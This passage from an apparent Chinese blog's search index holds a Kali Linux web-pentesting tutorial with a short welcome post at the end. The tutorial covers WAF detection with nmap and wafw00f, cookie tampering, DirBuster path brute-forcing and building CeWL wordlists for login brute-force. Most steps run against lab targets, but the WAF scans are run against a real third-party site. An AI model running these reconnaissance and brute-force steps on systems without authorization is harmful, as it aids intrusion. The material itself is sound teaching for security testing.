id="2-2-1-操作步骤"><a href="#2-2-1-操作步骤" class="headerlink" title="2.2.1 操作步骤"></a>2.2.1 操作步骤</h4><ol><li><p>Nmap 包含了一些<strong>脚本</strong>，用于测试 WAF 的存在。在漏洞服务器上尝试它们：</p><blockquote><p>nmap -p 80,443 –script=http-waf-detect 192.168.56.102</p></blockquote><p> <img src="./nmap-waf-1.png" alt><br> 没检测到任何 WAF，漏洞服务器上没有任何WAF。</p></li><li><p>在真正拥有防火墙的服务器上尝试相同命令，使用<code>www.baidu.com</code>.</p><blockquote><p>nmap -p 80,443 –script=http-waf-detect <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote><p> <img src="./nmap-waf-2.png" alt><br> 可以看到，80和443端口都配备有WAF。</p></li><li><p>另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确。</p><blockquote><p>nmap -p 80,443 –script=http-waf-fingerprint <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote></li><li><p>另一个 Kali Linux 自带的工具可以帮助我们检测和是被 WAF，它叫做<code>waf00f</code>。</p><blockquote><p>waf00f <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote><p> <img src="./nmap-waf-3.png" alt></p></li></ol><h4 id="2-2-2-工作原理"><a href="#2-2-2-工作原理" class="headerlink" title="2.2.2 工作原理"></a>2.2.2 工作原理</h4><p>WAF 检测的原理是通过<strong>发送特定请求</strong>到服务器，之后<strong>分析响应</strong>。例如，在http-waf-detect的例子中，它发送了一些基本的恶意封包，并对比响应，同时查找封包被阻拦、拒绝或检测到的标识。http-waf-fingerprint也一样，但是这个脚本也尝试拦截响应，并根据已知的不同 IDS 和 WAF 的模式对其分类。wafw00f也是这样。</p><h3 id="2-3-获取和修改-Cookie"><a href="#2-3-获取和修改-Cookie" class="headerlink" title="2.3 获取和修改 Cookie"></a>2.3 获取和修改 Cookie</h3><p>Cookie 是由服务器发送给浏览器（客户端）的小型信息片段，用于在本地储存一些信息，它们和特定用户相关。在现代Web应用中，Cookie用于储存用户特定的数据、例如主题颜色配置、对象排列偏好、上一个活动、以及（对我们更重要）会话标识符。</p><h4 id="2-3-1-实验操作"><a href="#2-3-1-实验操作" class="headerlink" title="2.3.1 实验操作"></a>2.3.1 实验操作</h4><ol><li><p>启动 Mantra ，在终端输入即可启动</p><blockquote><p>owasp-mantra-ff</p></blockquote></li><li><p>从 Mantra 的菜单栏访问Tools | Application Auditing | Cookies Manager +<br> 浏览<a href="http://192.168.91.130/WackoPicko/" target="_blank" rel="noopener">http://192.168.91.130/WackoPicko/</a><br> <img src="./cookie-1.png" alt><br> 在这个截图中，我们可以从这个插件中看到所有该时刻储存的Cookie，以及所有它们所属的站点。我们也可以修改它们的值，删除它们以及添加新的条目。</p></li></ol><h4 id="2-3-2-工作原理"><a href="#2-3-2-工作原理" class="headerlink" title="2.3.2 工作原理"></a>2.3.2 工作原理</h4><p><code>Cookies Manager+</code> 是个浏览器插件，允许我们<strong>查看</strong>、<strong>修改</strong>或<strong>删除</strong>现有的Cookie，以及<strong>添加新的条目</strong>。因为一些应用依赖于储存在这些Cookie中的值，<strong>攻击者可以使用它们来输入恶意的模式</strong>，可能会修改页面行为，或者<strong>提供伪造信息用于获取高阶权限</strong>。</p><p>同时，在现代 Web 应用中，会话Cookie通常被使用，通常是登录完成之后的用户标识符的唯一兰苑。这会导致潜在的有效用户冒充，通过将Cookie值替换为某个活动会话的用户。</p><h3 id="2-4-使用-DirBuster-发现文件和文件夹"><a href="#2-4-使用-DirBuster-发现文件和文件夹" class="headerlink" title="2.4 使用 DirBuster 发现文件和文件夹"></a>2.4 使用 DirBuster 发现文件和文件夹</h3><p><code>DirBuster</code> 是个工具，用于通过爆破来发现Web服务器中的现存文件和目录。<br>DirBuster在 kali 下自带字典的路径为</p><blockquote><p>/usr/share/dirbuster/wordlists/</p></blockquote><p><img src="./dirbster-dic.png" alt></p><h4 id="2-4-1-实验操作"><a href="#2-4-1-实验操作" class="headerlink" title="2.4.1 实验操作"></a>2.4.1 实验操作</h4><p><img src="./dirbster-use.png" alt><br>如上图，<br>线程一般设置20；字典文件选择自带的即可；递归选项有时可以去点。</p><h4 id="2-4-2-工作原理"><a href="#2-4-2-工作原理" class="headerlink" title="2.4.2 工作原理"></a>2.4.2 工作原理</h4><p>DirBuster 是个爬虫和爆破器的组合，<strong>它允许页面上的所有连接</strong>，<strong>同时尝试可能文件的不同名称</strong>。这些名称可以保存在文件中，类似于我们所使用的那个，或者可以由DirBuster 通过“纯粹暴力破解”选项，并为生成单词设置字符集和最小最大长度来自动生成。</p><p>为了判断文件是否存在，DirBuster使用服务器生成的响应代码。最常见的响应在下面列出：</p><ul><li><p><code>200 OK</code>：文件存在并能够读取。</p></li><li><p><code>301 Moved permanently</code>：这是到给定 URL 的重定向。</p></li><li><p><code>401 Unauthorized</code>：需要权限来访问这个文件。</p></li><li><p><code>403 Forbidden</code>：请求有效但是服务器拒绝响应。</p></li><li><p><code>404 File not found</code>：文件不存在。</p></li></ul><h3 id="2-5-使用-Cewl-分析密码"><a href="#2-5-使用-Cewl-分析密码" class="headerlink" title="2.5 使用 Cewl 分析密码"></a>2.5 使用 Cewl 分析密码</h3><p>cewl 通过<strong>爬行网站</strong>获取关键信息<strong>创建一个密码字典</strong></p><p><strong>使用 CeWL 来获取应用所使用的单词列表</strong>。并保存它用于之后的登录页面暴力破解。</p><h4 id="2-5-1-操作步骤"><a href="#2-5-1-操作步骤" class="headerlink" title="2.5.1 操作步骤"></a>2.5.1 操作步骤</h4><ol><li><p>首先查看一下 cewl 的帮助文档，了解相关的选项<br> <img src="./cewl-h.png" alt></p></li><li><p>使用 cewl 来获得漏洞服务器中 <code>WackoPicko应用</code> 中的单词。长度最小为5 的单词，显示单词数量，将结果保存到cewl_WackoPicko.txt<br> <code>cewl -w cewl_WackoPicko.txt -c -m 5 http://192.168.91.130/WackoPicko/</code><br> <img src="./cewl-2.png" alt></p></li><li><p>查看结果<br> <img src="./cewl-3.png" alt><br> 这个列表仍然需要一些过滤来去掉数量多但是不可能用于密码的单词，例如“Services”，“Content”或者“information”。</p></li></ol><h4 id="2-5-2-工作原理"><a href="#2-5-2-工作原理" class="headerlink" title="2.5.2 工作原理"></a>2.5.2 工作原理</h4><p>CeWL 是个 Kali 中的工具，<strong>爬取网站并提取独立单词的列表</strong>。它也可以提供每个单词的重复次数，保存结果到文件，使用页面的元数据以及其它。</p><h4 id="2-5-3-其他相关工具"><a href="#2-5-3-其他相关工具" class="headerlink" title="2.5.3 其他相关工具"></a>2.5.3 其他相关工具</h4><p>其它工具也可用于类似目的，它们中的一些生成<strong>基于规则或其它单词列表</strong>的单词列表，另一些可以<strong>爬取网站来寻找最常用的单词</strong>。</p><ul><li>Crunch：这是<strong>基于由用户提供的字符集合</strong>的生成器。它使用这个集合来生成所有可能的组合。Crunch 包含在 Kali 中。</li><li>Wordlist Maker (WLM)：WLM 能够<strong>基于字符集</strong>来生成单词列表，也能够<strong>从文本文件和网页中提取单词</strong>（<a href="http://www.pentestplus.co.uk/wlm.htm）。" target="_blank" rel="noopener">http://www.pentestplus.co.uk/wlm.htm）。</a></li><li>Common User Password Profiler (CUPP)：这个工具可以<strong>使用单词列表</strong>来为常见的用户名分析可能的密码，以及<strong>从数据库下载单词列表和默认密码</strong>（<a href="https://github.com/Mebus/cupp）。" target="_blank" rel="noopener">https://github.com/Mebus/cupp）。</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome！</title>
      <link href="/passages/welcome/"/>
      <url>/passages/welcome/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://www.fenghlz.xyz/">FengHLZ’blog</a></p><blockquote><p>新的，好看的博客。<br>旧博客。。就放那吧。。<br>从今天起，好好学习。</p></blockquote><p><img src="./1538583359355.jpg" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xyz</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
